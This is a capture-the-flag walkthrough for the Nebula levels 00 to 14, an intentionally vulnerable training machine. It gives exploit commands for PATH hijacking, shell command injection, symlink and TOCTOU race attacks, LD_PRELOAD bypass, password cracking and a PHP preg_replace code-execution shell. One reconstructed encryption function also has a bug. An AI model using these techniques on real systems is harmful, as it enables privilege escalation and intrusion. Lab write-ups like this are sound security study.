# The Writeup for Nebula Level

## Introduction

This writeup is for Nebula level in [exploit-exercises.com] (https://exploit-exercises.com/nebula/).
Users can download a virtual disk file and setup a virtual machine to do exercises. The login user/password pair is nebula/nebula, which also contains the sudo permission. Regarding each level, users can apply levelXX/levelXX user/password pair to challenge each level.

Regarding the emulated screen is not friendly. We can setup ssh and login remotely. However, please generate RSA and DSA key pair firstly.

```
ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key
ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key
service ssh restart
```   

Then ssh from your local terminal. The IP address depends on your Network configuration of Virtual Box. I chose NAT mode and set port forward.

```
ssh -p 1222 nebula@127.0.0.1
```

## Writeup

### Level00

Firstly, please login as level00 with the password of level00.

The mission is to find a Set User ID program that will run as the “flag00” account.

After check the manual of `find` command, the command is followed.
 
```
find / -perm -4000 -user flag00 > result.log
cat result.log
```

The aim program is `/rofs/bin/.../flag00` and the output is that `Congrats, now run getflag to get your flag!`

The fullpath of the flag program is `/bin/getflag`.

### Level01
The vulnerability of this level is about PATH variable in the environment. We can set current directory as PATH by command `env PATH=.`, then link `echo` to flag program.

The following shell script shows the exploit process.

```
ln -s /bin/getflag echo
env PATH=. /home/flag01/flag01
```

### Level02
The vulnerability of level02 is about shell command injection.

The following shell script will load flag program.

```
ln -s /bin/getflag x
env PATH=. USER='hacked; ./x' /home/flag02/flag02
```

### Level03
The vulnerability is about a writable crontab directory. The permission of `writable.d` is `0777`, which means any one is able to add a file in this directory. As any scripts in this directory will be executed by writable.sh, I just put a script to load flag program.

The content of the script is followed.

```
#!/bin/sh
/bin/getflag > /tmp/level03.log
``` 

After a short time (5 minutes), the script will be executed and the log file can be found.

### Level04
It is not a good practice that restricting access file based on filename, because soft link can be used to bypass such control.

```
ln -s /home/flag04/token x
/home/flag04/flag04 x
```

The output is `06508b5e-8909-4f38-b630-fdb148a848a2` .

### Level05
In the home of user level05, `.backup` directory can be read by others. `backup-19072011.tgz` is stored in this directory. I decompressed it and found private key for ssh.

The following ssh command will be used to login without password.

```
ssh -i ./id_rsa flag05@localhost
```

### Level06
The password of user `flag06` is followed UNIX style. The hash value is stored in `/etc/password`.

`flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh`

The hash can be cracked by John the Ripper on Kali.

save user:hash into a file named test_pass.txt and apply this command to crack.

`john test_pass.txt `

The output shows the password is `hello`

```
root@kali:/tmp# john test_pass.txt 
Loaded 1 password hash (Traditional DES [128/128 BS SSE2-16])
hello            (flag06)
guesses: 1  time: 0:00:00:00 DONE (Mon Dec 21 12:18:25 2015)  c/s: 74200  trying: 123456 - thebest3
Use the "--show" option to display all of the cracked passwords reliably
```

### Level07
Command injection happened again.
This time, I changed network mode to bridge mode.

` curl -v "http://192.168.1.224:7007/index.cgi?Host=127.0.0.1+%3b+/bin/getflag"`

I inserted the second command after Host parameter.

### Level08
There is a pcap file in this level. I will use Wireshark to analyse the package file. 

The following snapshot image shows the password of flag08 is `backd00Rmate`

![The image of snapshot in level08](level08.png)

Please notice that 0x7f is DEL, which means delete previous key.

### Level09
The vulnerability is about `preg_replace()` in PHP.

The vulnerable line is followed.
```
$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
```

Before PHP extract email to spam function, there is chance to execute php function.

I created a file with content `[email ${${@exec(sh)}}]`

The following command will get a shell.

```
/home/flag09/flag09 ./test.txt 111
```

One interesting thing is that I failed to pass `/bin/getflag` because of special character `/`.

More study is needed about preg_replace vulnerability.

### Level10
The vulnerability is that the `access()` and the `open()` is based on filename. I can launch a TOCTOU attack (race condition attack). Firstly, establish a soft link to a file that user level10 has read permission. Secondly, change the soft link to flag file.

Launch a listener at host.
```
nc -l -k -n 192.168.1.88 18211
```

The feasible way to do a race condition attack is make `connect()` last longer.

One idea is to set `iptables` drop SYN|ACK from host for a short time. In this case, program of level10 will try to resent ACK package. Then I will change the soft link to token file. After re-configurating `iptables`, the TCP connection will be finished.

The commands for controlling iptables are followed.

```
# assumption client(flag10 program): 192.168.1.224, and server is 192.168.1.133

iptables -L --line-numbers

iptables -A OUTPUT --protocol tcp --tcp-flags ALL SYN,ACK --dst 192.168.1.224 -j DROP

iptables -L --line-numbers

iptables -D INPUT 1

```

Another idea is to apply raw socket programming on the server side to make a delay manually. 

They are just ideas. I only tried first method and succeeded.

The flag is followed.

`615a2ce1-b2b5-4c76-8eed-8aa5c4015c27`

### Level11
An logical vulnerability is in the level11.
The following encryption process is symmetric, which means decryption is the same.

```
void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}
```

If I input Content-Length as 1, the cipher is calculated as followed.`buffer[0]^=0x01`

I chose following input.

```
Content-Length: 1
B
```
The command will be `C` instead.

### Level12
The command injection shows again.
The vulnerability is in this line.
` prog = io.popen("echo "..password.." | sha1sum", "r")`

If I pass password as `4754a4f4bd5787accd33de887b9250a0691dd198 #`, the `#` will terminate the pipe command.

### Level13
The vulnerability is that access control based on `getuid()` can be bypassed through LD_PRELOAD.

Firstly, I compiled a fake getuid function into a shared library.
  
The Makefile is followed.

```
all:
	gcc -nostdlib -fpic  -shared getuid.c -o getuid.so
	

```
And the source code is followed.

```
#include <sys/types.h>

uid_t getuid(void){
	return 1000;
}
```

Secondly, The LD_PRELOAD technology cannot be used directly, since the set-user-ID mode is turned on at flag13 program. However, since the token exists in the program, I will copy the original program into another place, then use LD_PRELOAD technology.

```
cp /home/flag13/flag13 .
env  LD_PRELOAD=/tmp/level13/getuid.so ./flag13 
```

The program tells me that the token is `b705702b-76a8-42b0-8844-3adabbe5ac58`

### Level14
This level tries to challenge the decryption sense.
I first use number sequence, and then try alphabet sequence.

```
sh-4.2$ ./flag14 -e
012345678901234567890
02468:<>@B:<>@BDFHJLD

sh-4.2$ ./flag14 -e
abcdefghijklmnopqrstuvwxyz
acegikmoqsuwy{}??????????$
```

I found the encryption code is that

```
void encrypt(char* str){
	int i=0;
	while (str[i]){
		str[i]=str[i]+i;
	}
}
```

According to the encryption code, the decryption code is that

```
#include <stdio.h>

void decrypt(char* str){
	int i=0;
	while (str[i]){
		str[i] = str[i]-i;
		i++;
	}
}
int main(){
	char code[]="857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.";
	decrypt(code);
	printf("%s\n",code);
}
```

The output shows 
`8457c118-887c-4e40-a5a6-33a25353165`
